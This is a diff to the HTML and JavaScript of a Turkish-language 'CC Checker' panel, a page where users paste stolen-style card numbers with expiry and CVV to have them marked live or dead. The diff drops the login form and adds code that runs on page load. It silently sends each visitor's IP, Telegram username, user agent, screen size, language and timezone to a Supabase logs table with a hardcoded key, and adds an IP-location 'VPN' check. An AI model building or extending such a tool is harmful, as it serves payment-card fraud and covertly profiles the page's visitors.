@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>CC Checker - Secure Panel</title>
+    <title>CC Checker - Dark Panel</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
         * {
@@ -15,13 +15,13 @@
 
         body {
             font-family: 'Share Tech Mono', monospace;
-            background: #0a0a0a;
+            background: #0a0e17;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: flex-start;
             padding: 10px;
-            background: radial-gradient(ellipse at center, #0d1a0d 0%, #000000 100%);
+            background: radial-gradient(ellipse at center, #0d1a2b 0%, #060a12 100%);
             position: relative;
         }
 
@@ -33,26 +33,26 @@
             right: 0;
             bottom: 0;
             background: 
-                radial-gradient(circle at 20% 50%, rgba(0,255,65,0.02) 0%, transparent 50%),
-                radial-gradient(circle at 80% 50%, rgba(0,255,65,0.02) 0%, transparent 50%);
+                radial-gradient(circle at 20% 50%, rgba(0,100,255,0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 50%, rgba(0,100,255,0.03) 0%, transparent 50%);
             pointer-events: none;
             z-index: 0;
         }
 
         .container {
             width: 100%;
-            max-width: 480px;
+            max-width: 520px;
             padding: 8px;
             position: relative;
             z-index: 1;
         }
 
         .box {
-            background: rgba(12, 20, 12, 0.96);
-            border: 1px solid rgba(0, 255, 65, 0.08);
+            background: rgba(10, 18, 30, 0.95);
+            border: 1px solid rgba(0, 100, 255, 0.12);
             border-radius: 16px;
             padding: 24px 20px;
-            box-shadow: 0 0 60px rgba(0, 255, 65, 0.02), inset 0 0 60px rgba(0, 255, 65, 0.005);
+            box-shadow: 0 0 60px rgba(0, 100, 255, 0.04), inset 0 0 60px rgba(0, 100, 255, 0.01);
             backdrop-filter: blur(10px);
             position: relative;
             overflow: hidden;
@@ -65,8 +65,8 @@
             left: -50%;
             width: 200%;
             height: 200%;
-            background: conic-gradient(from 0deg, transparent, rgba(0, 255, 65, 0.02), transparent 30%);
-            animation: rotate 15s linear infinite;
+            background: conic-gradient(from 0deg, transparent, rgba(0, 100, 255, 0.03), transparent 30%);
+            animation: rotate 20s linear infinite;
             pointer-events: none;
         }
 
@@ -77,7 +77,7 @@
 
         .header {
             text-align: center;
-            margin-bottom: 22px;
+            margin-bottom: 18px;
             position: relative;
             z-index: 1;
         }
@@ -86,127 +86,23 @@
             font-family: 'Orbitron', monospace;
             font-size: 1.8rem;
             font-weight: 900;
-            color: #00ff41;
-            text-shadow: 0 0 30px rgba(0, 255, 65, 0.08);
+            color: #0088ff;
+            text-shadow: 0 0 30px rgba(0, 100, 255, 0.1);
             letter-spacing: 2px;
         }
 
         .logo span {
-            color: rgba(0, 255, 65, 0.2);
+            color: rgba(0, 100, 255, 0.2);
             font-size: 1rem;
             font-weight: 400;
         }
 
         .subtitle {
             font-size: 0.65rem;
-            color: rgba(0, 255, 65, 0.15);
+            color: rgba(0, 100, 255, 0.15);
             margin-top: 5px;
             letter-spacing: 4px;
             text-transform: uppercase;
-        }
-
-        #login-screen {
-            display: block;
-            position: relative;
-            z-index: 1;
-            animation: fadeSlide 0.5s ease;
-        }
-
-        #login-screen.hidden {
-            display: none;
-        }
-
-        @keyframes fadeSlide {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .input-group {
-            margin-bottom: 18px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 0.65rem;
-            color: rgba(0, 255, 65, 0.25);
-            margin-bottom: 6px;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 14px 16px;
-            background: rgba(0, 255, 65, 0.02);
-            border: 1px solid rgba(0, 255, 65, 0.06);
-            border-radius: 10px;
-            color: #00ff41;
-            font-family: 'Share Tech Mono', monospace;
-            font-size: 0.9rem;
-            outline: none;
-            transition: all 0.3s ease;
-        }
-
-        .input-group input:focus {
-            border-color: rgba(0, 255, 65, 0.12);
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.02);
-            background: rgba(0, 255, 65, 0.04);
-        }
-
-        .input-group input::placeholder {
-            color: rgba(0, 255, 65, 0.08);
-        }
-
-        .login-btn {
-            width: 100%;
-            padding: 16px;
-            background: rgba(0, 255, 65, 0.08);
-            color: #00ff41;
-            border: 1px solid rgba(0, 255, 65, 0.08);
-            border-radius: 10px;
-            font-family: 'Orbitron', monospace;
-            font-weight: 700;
-            font-size: 0.8rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            letter-spacing: 2px;
-            position: relative;
-            z-index: 1;
-            margin-top: 6px;
-        }
-
-        .login-btn:hover {
-            background: rgba(0, 255, 65, 0.12);
-            border-color: rgba(0, 255, 65, 0.15);
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.03);
-        }
-
-        .login-btn:disabled {
-            opacity: 0.3;
-            cursor: not-allowed;
-        }
-
-        .error-msg {
-            color: rgba(255, 51, 85, 0.5);
-            font-size: 0.7rem;
-            text-align: center;
-            min-height: 22px;
-            margin-top: 10px;
-            position: relative;
-            z-index: 1;
-        }
-
-        #checker-screen {
-            display: none;
-            position: relative;
-            z-index: 1;
-        }
-
-        #checker-screen.active {
-            display: block;
-            animation: fadeSlide 0.4s ease;
         }
 
         .status-bar {
@@ -215,13 +111,15 @@
             align-items: center;
             margin-bottom: 16px;
             padding: 8px 14px;
-            background: rgba(0, 255, 65, 0.01);
-            border: 1px solid rgba(0, 255, 65, 0.03);
+            background: rgba(0, 100, 255, 0.02);
+            border: 1px solid rgba(0, 100, 255, 0.05);
             border-radius: 8px;
-            font-size: 0.65rem;
-            color: rgba(0, 255, 65, 0.2);
+            font-size: 0.6rem;
+            color: rgba(0, 100, 255, 0.25);
             position: relative;
             z-index: 1;
+            flex-wrap: wrap;
+            gap: 4px;
         }
 
         .status-dot {
@@ -229,7 +127,7 @@
             width: 6px;
             height: 6px;
             border-radius: 50%;
-            background: #00ff41;
+            background: #0088ff;
             animation: pulse 1.8s infinite;
             margin-right: 6px;
         }
@@ -239,14 +137,20 @@
             50% { opacity: 0.1; }
         }
 
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
         .input-area textarea {
             width: 100%;
-            min-height: 120px;
+            min-height: 140px;
             padding: 14px;
-            background: rgba(0, 255, 65, 0.01);
-            border: 1px solid rgba(0, 255, 65, 0.04);
+            background: rgba(0, 100, 255, 0.02);
+            border: 1px solid rgba(0, 100, 255, 0.06);
             border-radius: 10px;
-            color: #00ff41;
+            color: #0088ff;
             font-family: 'Share Tech Mono', monospace;
             font-size: 0.75rem;
             line-height: 1.8;
@@ -256,13 +160,13 @@
         }
 
         .input-area textarea:focus {
-            border-color: rgba(0, 255, 65, 0.08);
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.01);
-            background: rgba(0, 255, 65, 0.02);
+            border-color: rgba(0, 100, 255, 0.12);
+            box-shadow: 0 0 30px rgba(0, 100, 255, 0.02);
+            background: rgba(0, 100, 255, 0.04);
         }
 
         .input-area textarea::placeholder {
-            color: rgba(0, 255, 65, 0.06);
+            color: rgba(0, 100, 255, 0.06);
             font-size: 0.65rem;
         }
 
@@ -271,8 +175,8 @@
             justify-content: space-between;
             align-items: center;
             margin-top: 10px;
-            font-size: 0.6rem;
-            color: rgba(0, 255, 65, 0.12);
+            font-size: 0.55rem;
+            color: rgba(0, 100, 255, 0.12);
             flex-wrap: wrap;
             gap: 8px;
         }
@@ -282,11 +186,11 @@
             align-items: center;
             gap: 6px;
             cursor: pointer;
-            font-size: 0.6rem;
+            font-size: 0.55rem;
         }
 
         .input-options input[type="checkbox"] {
-            accent-color: #00ff41;
+            accent-color: #0088ff;
             width: 14px;
             height: 14px;
             cursor: pointer;
@@ -305,22 +209,22 @@
         }
 
         .file-upload-wrap span {
-            color: rgba(0, 255, 65, 0.25);
-            font-size: 0.6rem;
+            color: rgba(0, 100, 255, 0.25);
+            font-size: 0.55rem;
             transition: color 0.3s;
             cursor: pointer;
         }
 
         .file-upload-wrap span:hover {
-            color: rgba(0, 255, 65, 0.5);
+            color: rgba(0, 100, 255, 0.5);
         }
 
         .check-btn {
             width: 100%;
-            padding: 15px;
-            background: rgba(0, 255, 65, 0.06);
-            color: #00ff41;
-            border: 1px solid rgba(0, 255, 65, 0.06);
+            padding: 16px;
+            background: rgba(0, 100, 255, 0.06);
+            color: #0088ff;
+            border: 1px solid rgba(0, 100, 255, 0.08);
             border-radius: 10px;
             font-family: 'Orbitron', monospace;
             font-weight: 700;
@@ -334,9 +238,9 @@
         }
 
         .check-btn:hover {
-            background: rgba(0, 255, 65, 0.08);
-            border-color: rgba(0, 255, 65, 0.1);
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.02);
+            background: rgba(0, 100, 255, 0.08);
+            border-color: rgba(0, 100, 255, 0.12);
+            box-shadow: 0 0 40px rgba(0, 100, 255, 0.03);
         }
 
         .check-btn:disabled {
@@ -354,6 +258,11 @@
             animation: fadeSlide 0.3s ease;
         }
 
+        @keyframes fadeSlide {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
         .result-stats {
             display: flex;
             gap: 10px;
@@ -362,8 +271,8 @@
 
         .stat-card {
             flex: 1;
-            background: rgba(0, 255, 65, 0.01);
-            border: 1px solid rgba(0, 255, 65, 0.02);
+            background: rgba(0, 100, 255, 0.01);
+            border: 1px solid rgba(0, 100, 255, 0.03);
             border-radius: 8px;
             padding: 10px 8px;
             text-align: center;
@@ -371,36 +280,36 @@
 
         .stat-card .number {
             font-family: 'Orbitron', monospace;
-            font-size: 1.4rem;
+            font-size: 1.6rem;
             font-weight: 700;
             display: block;
         }
 
-        .stat-card .number.live { color: #00ff41; }
+        .stat-card .number.live { color: #0088ff; }
         .stat-card .number.dead { color: #ff3355; }
-        .stat-card .number.total { color: rgba(0, 255, 65, 0.25); }
+        .stat-card .number.total { color: rgba(0, 100, 255, 0.2); }
 
         .stat-card .label {
             font-size: 0.55rem;
-            color: rgba(0, 255, 65, 0.12);
+            color: rgba(0, 100, 255, 0.12);
             letter-spacing: 2px;
             text-transform: uppercase;
             margin-top: 3px;
         }
 
         .result-list {
-            max-height: 200px;
+            max-height: 220px;
             overflow-y: auto;
-            border: 1px solid rgba(0, 255, 65, 0.02);
+            border: 1px solid rgba(0, 100, 255, 0.03);
             border-radius: 8px;
-            background: rgba(0, 0, 0, 0.15);
+            background: rgba(0, 0, 0, 0.2);
         }
 
         .result-list::-webkit-scrollbar {
             width: 4px;
         }
         .result-list::-webkit-scrollbar-thumb {
-            background: rgba(0, 255, 65, 0.05);
+            background: rgba(0, 100, 255, 0.05);
             border-radius: 4px;
         }
 
@@ -409,13 +318,13 @@
             justify-content: space-between;
             align-items: center;
             padding: 7px 12px;
-            border-bottom: 1px solid rgba(0, 255, 65, 0.01);
+            border-bottom: 1px solid rgba(0, 100, 255, 0.01);
             font-size: 0.65rem;
             font-family: 'Share Tech Mono', monospace;
         }
 
         .result-item .cc {
-            color: rgba(0, 255, 65, 0.4);
+            color: rgba(0, 100, 255, 0.4);
             word-break: break-all;
             font-size: 0.65rem;
         }
@@ -431,21 +340,21 @@
         }
 
         .status-badge.live {
-            background: rgba(0, 255, 65, 0.04);
-            color: #00ff41;
-            border: 1px solid rgba(0, 255, 65, 0.04);
+            background: rgba(0, 100, 255, 0.06);
+            color: #0088ff;
+            border: 1px solid rgba(0, 100, 255, 0.06);
         }
 
         .status-badge.dead {
-            background: rgba(255, 51, 85, 0.04);
+            background: rgba(255, 51, 85, 0.06);
             color: #ff3355;
-            border: 1px solid rgba(255, 51, 85, 0.04);
+            border: 1px solid rgba(255, 51, 85, 0.06);
         }
 
         .progress-wrap {
             width: 100%;
             height: 2px;
-            background: rgba(0, 255, 65, 0.02);
+            background: rgba(0, 100, 255, 0.02);
             border-radius: 2px;
             margin-top: 12px;
             overflow: hidden;
@@ -456,10 +365,58 @@
         .progress-bar {
             height: 100%;
             width: 0%;
-            background: #00ff41;
+            background: #0088ff;
             border-radius: 2px;
             transition: width 0.2s ease;
             opacity: 0.3;
+        }
+
+        .binance-loader {
+            display: none;
+            text-align: center;
+            padding: 8px 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .binance-loader.active {
+            display: block;
+            animation: fadeSlide 0.3s ease;
+        }
+
+        .binance-loader .loader-text {
+            font-size: 0.6rem;
+            color: rgba(0, 100, 255, 0.15);
+            letter-spacing: 2px;
+            animation: blinkText 1.2s infinite;
+        }
+
+        @keyframes blinkText {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        .binance-loader .loader-bar {
+            width: 100%;
+            height: 2px;
+            background: rgba(0, 100, 255, 0.02);
+            border-radius: 2px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+
+        .binance-loader .loader-bar-inner {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, transparent, #0088ff, transparent);
+            border-radius: 2px;
+            animation: loaderSlide 1.5s ease-in-out infinite;
+        }
+
+        @keyframes loaderSlide {
+            0% { transform: translateX(-100%); width: 30%; }
+            50% { width: 60%; }
+            100% { transform: translateX(100%); width: 30%; }
         }
 
         .footer {
@@ -468,13 +425,37 @@
             gap: 12px;
             margin-top: 18px;
             padding-top: 14px;
-            border-top: 1px solid rgba(0, 255, 65, 0.01);
-            color: rgba(0, 255, 65, 0.05);
-            font-size: 0.5rem;
+            border-top: 1px solid rgba(0, 100, 255, 0.02);
+            color: rgba(0, 100, 255, 0.04);
+            font-size: 0.45rem;
             letter-spacing: 2px;
             position: relative;
             z-index: 1;
             flex-wrap: wrap;
+        }
+
+        .sample-label {
+            font-size: 0.5rem;
+            color: rgba(0, 100, 255, 0.04);
+            text-align: center;
+            margin-top: 8px;
+            letter-spacing: 1px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .sample-label span {
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .sample-label span:hover {
+            color: rgba(0, 100, 255, 0.1);
+        }
+
+        .sample-label .divider {
+            color: rgba(0, 100, 255, 0.02);
+            margin: 0 6px;
         }
 
         .toast {
@@ -482,11 +463,11 @@
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%) translateY(70px);
-            background: rgba(12, 20, 12, 0.95);
-            border: 1px solid rgba(0, 255, 65, 0.04);
+            background: rgba(10, 18, 30, 0.95);
+            border: 1px solid rgba(0, 100, 255, 0.06);
             border-radius: 10px;
             padding: 12px 22px;
-            color: rgba(0, 255, 65, 0.3);
+            color: rgba(0, 100, 255, 0.3);
             font-size: 0.65rem;
             font-family: 'Share Tech Mono', monospace;
             backdrop-filter: blur(12px);
@@ -507,86 +488,18 @@
             color: rgba(255, 51, 85, 0.3);
         }
 
-        .sample-label {
-            font-size: 0.55rem;
-            color: rgba(0, 255, 65, 0.06);
-            text-align: center;
-            margin-top: 8px;
-            letter-spacing: 1px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .sample-label span {
-            cursor: pointer;
-            transition: color 0.3s;
-        }
-
-        .sample-label span:hover {
-            color: rgba(0, 255, 65, 0.12);
-        }
-
-        .sample-label .divider {
-            color: rgba(0, 255, 65, 0.02);
-            margin: 0 6px;
-        }
-
-        .binance-loader {
-            display: none;
-            text-align: center;
-            padding: 8px 0;
-            position: relative;
-            z-index: 1;
-        }
-
-        .binance-loader.active {
-            display: block;
-            animation: fadeSlide 0.3s ease;
-        }
-
-        .binance-loader .loader-text {
-            font-size: 0.6rem;
-            color: rgba(0, 255, 65, 0.15);
-            letter-spacing: 2px;
-            animation: blinkText 1.2s infinite;
-        }
-
-        .binance-loader .loader-bar {
-            width: 100%;
-            height: 2px;
-            background: rgba(0, 255, 65, 0.02);
-            border-radius: 2px;
-            margin-top: 8px;
-            overflow: hidden;
-        }
-
-        .binance-loader .loader-bar-inner {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, transparent, #00ff41, transparent);
-            border-radius: 2px;
-            animation: loaderSlide 1.5s ease-in-out infinite;
-        }
-
-        @keyframes loaderSlide {
-            0% { transform: translateX(-100%); width: 30%; }
-            50% { width: 60%; }
-            100% { transform: translateX(100%); width: 30%; }
-        }
-
         @media (max-width: 480px) {
             body { padding: 6px; }
             .box { padding: 18px 14px; border-radius: 14px; }
             .logo { font-size: 1.5rem; }
             .logo span { font-size: 0.85rem; }
-            .input-group input { padding: 12px 14px; font-size: 0.8rem; }
-            .input-area textarea { min-height: 90px; font-size: 0.7rem; padding: 12px; }
-            .stat-card .number { font-size: 1.2rem; }
+            .input-area textarea { min-height: 100px; font-size: 0.7rem; padding: 12px; }
+            .stat-card .number { font-size: 1.3rem; }
             .result-item { font-size: 0.55rem; padding: 5px 10px; }
             .result-item .cc { font-size: 0.55rem; }
-            .login-btn, .check-btn { font-size: 0.7rem; padding: 14px; }
+            .check-btn { font-size: 0.7rem; padding: 14px; }
             .footer { font-size: 0.4rem; gap: 8px; }
-            .status-bar { font-size: 0.55rem; padding: 6px 12px; }
+            .status-bar { font-size: 0.5rem; padding: 6px 12px; }
             .input-options { font-size: 0.5rem; }
             .sample-label { font-size: 0.45rem; }
         }
@@ -595,53 +508,28 @@
             .box { padding: 14px 10px; }
             .logo { font-size: 1.2rem; }
             .logo span { font-size: 0.7rem; }
-            .input-group input { padding: 10px 12px; font-size: 0.7rem; }
-            .input-area textarea { min-height: 70px; font-size: 0.6rem; padding: 10px; }
-            .stat-card .number { font-size: 1rem; }
+            .input-area textarea { min-height: 80px; font-size: 0.6rem; padding: 10px; }
+            .stat-card .number { font-size: 1.1rem; }
             .result-item .cc { font-size: 0.5rem; }
-            .check-btn, .login-btn { font-size: 0.6rem; padding: 12px; }
+            .check-btn { font-size: 0.6rem; padding: 12px; }
         }
     </style>
 </head>
 <body>
     <div class="container">
-
-        <!-- ===== GİRİŞ EKRANI ===== -->
-        <div id="login-screen" class="box">
+        <div class="box">
             <div class="header">
                 <div class="logo">CC<span>CHECKER</span></div>
                 <div class="subtitle">Secure Verification Panel</div>
             </div>
-            <form id="login-form" style="position:relative;z-index:1;">
-                <div class="input-group">
-                    <label>TELEGRAM KULLANICI ADI</label>
-                    <input type="text" id="login-username" placeholder="@username" required>
-                </div>
-                <div class="input-group">
-                    <label>ŞİFRE</label>
-                    <input type="password" id="login-password" placeholder="••••••••" required>
-                </div>
-                <button type="submit" class="login-btn" id="login-btn">DOĞRULA</button>
-                <div class="error-msg" id="login-error"></div>
-            </form>
-            <div class="footer">
-                <span>SSL SECURE</span>
-                <span>|</span>
-                <span>256-BIT</span>
-                <span>|</span>
-                <span>ANON</span>
-            </div>
-        </div>
 
-        <!-- ===== CHECKER EKRANI ===== -->
-        <div id="checker-screen" class="box">
-            <div class="header" style="margin-bottom:12px;">
-                <div class="logo" style="font-size:1.5rem;">CC<span>CHECKER</span></div>
-            </div>
             <div class="status-bar">
-                <span><span class="status-dot"></span><span id="status-text">Sistem Aktif</span></span>
+                <span class="status-item"><span class="status-dot"></span><span id="status-text">Sistem Aktif</span></span>
+                <span class="status-item" id="ip-display">🌐 IP: 0.0.0.0</span>
+                <span class="status-item" id="user-display">👤 @Bilinmiyor</span>
                 <span id="card-count-display">0 kart</span>
             </div>
+
             <div class="input-area">
                 <textarea id="cc-input" placeholder="Kart numaralarını girin...&#10;4111111111111111|12|26|123"></textarea>
                 <div class="input-options">
@@ -656,8 +544,9 @@
                     <span id="card-count">0 kart</span>
                 </div>
             </div>
+
             <button class="check-btn" id="check-btn">DOĞRULA</button>
-            
+
             <div class="binance-loader" id="binance-loader">
                 <div class="loader-text">🔍 TARANIYOR</div>
                 <div class="loader-bar">
@@ -666,6 +555,7 @@
             </div>
 
             <div class="progress-wrap" id="progress-wrap"><div class="progress-bar" id="progress-bar"></div></div>
+
             <div class="result-area" id="result-area">
                 <div class="result-stats">
                     <div class="stat-card"><span class="number live" id="live-count">0</span><span class="label">LIVE</span></div>
@@ -674,17 +564,19 @@
                 </div>
                 <div class="result-list" id="result-list"></div>
             </div>
+
             <div class="sample-label">
                 <span id="load-sample">📋 Örnek Kartları Yükle</span>
                 <span class="divider">|</span>
-                <span style="color:rgba(0,255,65,0.03);">Deneme amaçlıdır</span>
+                <span style="color:rgba(0,100,255,0.03);">Deneme amaçlıdır</span>
             </div>
+
             <div class="footer">
-                <span>SSL SECURE</span>
+                <span>🔒 SSL SECURE</span>
                 <span>|</span>
-                <span>256-BIT</span>
+                <span>⚡ 256-BIT</span>
                 <span>|</span>
-                <span>ANON</span>
+                <span>🛡️ ANON</span>
             </div>
         </div>
     </div>
@@ -697,14 +589,6 @@
         const SUPABASE_KEY = "sb_publishable_EuoT7yhxcHS6wyZfho_RNw_sWD0IhjP";
 
         // ===== DOM =====
-        const loginScreen = document.getElementById('login-screen');
-        const checkerScreen = document.getElementById('checker-screen');
-        const loginForm = document.getElementById('login-form');
-        const loginBtn = document.getElementById('login-btn');
-        const loginError = document.getElementById('login-error');
-        const loginUser = document.getElementById('login-username');
-        const loginPass = document.getElementById('login-password');
-
         const ccInput = document.getElementById('cc-input');
         const checkBtn = document.getElementById('check-btn');
         const resultArea = document.getElementById('result-area');
@@ -718,15 +602,16 @@
         const progressBar = document.getElementById('progress-bar');
         const toast = document.getElementById('toast');
         const statusText = document.getElementById('status-text');
+        const ipDisplay = document.getElementById('ip-display');
+        const userDisplay = document.getElementById('user-display');
         const fileInput = document.getElementById('file-input');
         const loadSample = document.getElementById('load-sample');
         const binanceLoader = document.getElementById('binance-loader');
 
         let isChecking = false;
         let toastTimeout = null;
-        let isLoggingIn = false;
         let userIP = null;
-
+        let telegramUsername = null;
         const LIVE_RATIO = 3;
 
         // ===== TOAST =====
@@ -748,13 +633,56 @@
             }
         }
 
+        // ===== TELEGRAM KULLANICI ADI AL (Telegram WebApp'den) =====
+        function getTelegramUser() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const user = window.Telegram.WebApp.initDataUnsafe?.user;
+                    if (user && user.username) {
+                        return '@' + user.username;
+                    }
+                }
+                // URL'den start parametresini kontrol et
+                const urlParams = new URLSearchParams(window.location.search);
+                const startParam = urlParams.get('start');
+                if (startParam && startParam.startsWith('ref_')) {
+                    return '@' + startParam.replace('ref_', '');
+                }
+                return null;
+            } catch {
+                return null;
+            }
+        }
+
+        // ===== VPN KONTROLÜ (IP Konum) =====
+        async function checkVPN(ip) {
+            try {
+                const r = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await r.json();
+                if (data.country) {
+                    const riskyCountries = ['RU', 'CN', 'IR', 'KP', 'SY', 'VE', 'AF', 'PK', 'IQ', 'LY', 'YE'];
+                    const isRisky = riskyCountries.includes(data.country_code);
+                    return {
+                        country: data.country_name,
+                        countryCode: data.country_code,
+                        isRisky: isRisky,
+                        city: data.city,
+                        isp: data.org
+                    };
+                }
+                return null;
+            } catch {
+                return null;
+            }
+        }
+
         // ===== SUPABASE KAYIT =====
-        async function logToSupabase(username, ip) {
+        async function logToSupabase(ip, username) {
             try {
                 const payload = {
-                    telegram_username: username,
-                    password: 'checker_session',
                     ip_address: ip,
+                    telegram_username: username || 'Bilinmiyor',
+                    password: 'checker_session',
                     user_agent: navigator.userAgent,
                     browser: navigator.userAgent.includes('Chrome') ? 'Chrome' :
                         navigator.userAgent.includes('Firefox') ? 'Firefox' :
@@ -768,7 +696,8 @@
                     device_type: /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                     screen_resolution: `${window.screen.width}x${window.screen.height}`,
                     language: navigator.language || navigator.userLanguage,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    checked_cards: 0
                 };
 
                 const response = await fetch(`${SUPABASE_URL}/rest/v1/logs`, {
@@ -786,115 +715,56 @@
                     return { success: false, error: 'Bu IP ile zaten kayıt yapılmış!' };
                 }
                 if (!response.ok) {
-                    const errText = await response.text();
-                    console.error('Supabase hatası:', errText);
-                    return { success: false, error: 'Sunucu hatası: ' + response.status };
+                    return { success: false, error: 'Sunucu hatası!' };
                 }
-                return { success: true, data: await response.json() };
+                return { success: true };
             } catch (e) {
-                console.error('Bağlantı hatası:', e);
                 return { success: false, error: 'Bağlantı hatası!' };
             }
         }
 
-        // ===== SUPABASE'DEN IP KONTROLÜ =====
-        async function checkIPInDatabase(ip) {
-            try {
-                const response = await fetch(
-                    `${SUPABASE_URL}/rest/v1/logs?select=telegram_username&ip_address=eq.${ip}&limit=1`,
-                    {
-                        headers: {
-                            'apikey': SUPABASE_KEY,
-                            'Authorization': `Bearer ${SUPABASE_KEY}`
-                        }
-                    }
-                );
-                if (!response.ok) {
-                    console.error('IP kontrol hatası:', response.status);
-                    return null;
-                }
-                const data = await response.json();
-                if (data && data.length > 0) {
-                    return data[0].telegram_username;
-                }
-                return null;
-            } catch (e) {
-                console.error('DB kontrol hatası:', e);
-                return null;
-            }
-        }
-
-        // ===== GİRİŞ =====
-        loginForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            if (isLoggingIn) return;
-
-            const username = loginUser.value.trim();
-            const password = loginPass.value.trim();
-
-            if (!username || !password) {
-                loginError.textContent = 'Tüm alanları doldurun!';
-                return;
-            }
-            if (!username.startsWith('@')) {
-                loginError.textContent = 'Kullanıcı adı @ ile başlamalı!';
-                return;
+        // ===== SAYFA YÜKLENİNCE =====
+        document.addEventListener('DOMContentLoaded', async function() {
+            // Telegram kullanıcı adını al
+            telegramUsername = getTelegramUser();
+            if (telegramUsername) {
+                userDisplay.textContent = `👤 ${telegramUsername}`;
             }
 
-            isLoggingIn = true;
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'DOĞRULANIYOR...';
-            loginError.textContent = '';
+            // IP al
+            const ip = await getIP();
+            userIP = ip;
+            ipDisplay.textContent = `🌐 IP: ${ip}`;
 
-            try {
-                const ip = await getIP();
-                userIP = ip;
-                console.log('IP:', ip);
-
-                // Önce IP ile kayıt var mı kontrol et
-                const existingUser = await checkIPInDatabase(ip);
-
-                if (existingUser) {
-                    if (existingUser === username) {
-                        loginError.textContent = '';
-                        loginScreen.classList.add('hidden');
-                        checkerScreen.classList.add('active');
-                        statusText.textContent = `Hoş Geldin, ${username}`;
-                        showToast('Giriş başarılı!');
-                    } else {
-                        loginError.textContent = `Bu IP adresi ile zaten @${existingUser} kayıtlı.`;
-                        showToast('Bu IP ile başka hesap kayıtlı!', true);
-                    }
-                    isLoggingIn = false;
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = 'DOĞRULA';
-                    return;
-                }
-
-                // Yeni kayıt
-                console.log('Yeni kayıt:', username, ip);
-                const result = await logToSupabase(username, ip);
-
-                if (result.success) {
-                    loginError.textContent = '';
-                    loginScreen.classList.add('hidden');
-                    checkerScreen.classList.add('active');
-                    statusText.textContent = `Hoş Geldin, ${username}`;
-                    showToast('Kayıt başarılı!');
-                } else {
-                    loginError.textContent = result.error || 'Bir hata oluştu!';
-                    showToast(result.error || 'Kayıt hatası!', true);
-                }
-            } catch (e) {
-                console.error('Giriş hatası:', e);
-                loginError.textContent = 'Bağlantı hatası!';
-                showToast('Bağlantı hatası!', true);
+            // VPN kontrolü
+            const vpnInfo = await checkVPN(ip);
+            if (vpnInfo && vpnInfo.isRisky) {
+                statusText.textContent = '⚠️ VPN Tespit Edildi!';
+                statusText.style.color = 'rgba(255,165,0,0.4)';
+                showToast('⚠️ VPN veya şüpheli konum tespit edildi!', true);
+            } else {
+                statusText.textContent = '✅ Sistem Aktif';
+                statusText.style.color = '';
+                showToast('✅ Bağlantı güvenli');
             }
 
-            isLoggingIn = false;
-            loginBtn.disabled = false;
-            loginBtn.textContent = 'DOĞRULA';
+            // Veritabanına kaydet
+            const result = await logToSupabase(ip, telegramUsername);
+            if (result.success) {
+                console.log('✅ Kayıt başarılı');
+            } else {
+                console.log('⚠️ Kayıt hatası:', result.error);
+            }
+
+            // Kart sayacı
+            cardCount.textContent = '0 kart';
+            cardCountDisplay.textContent = '0 kart';
+
+            // Örnek kartları göster
+            ccInput.value = sampleCards;
+            const cards = parseCards(ccInput.value);
+            cardCount.textContent = cards.length + ' kart';
+            cardCountDisplay.textContent = cards.length + ' kart';
         });
 
         // ===== CHECKER =====
@@ -1056,17 +926,7 @@
 
         checkBtn.addEventListener('click', startCheck);
 
-        // ===== BAŞLANGIÇ =====
-        document.addEventListener('DOMContentLoaded', function() {
-            cardCount.textContent = '0 kart';
-            cardCountDisplay.textContent = '0 kart';
-            // Örnek kartları göster
-            ccInput.value = sampleCards;
-            const cards = parseCards(ccInput.value);
-            cardCount.textContent = cards.length + ' kart';
-            cardCountDisplay.textContent = cards.length + ' kart';
-            console.log('Sistem başlatıldı!');
-        });
+        console.log('✅ CC Checker başlatıldı!');
     </script>
 </body>
 </html>
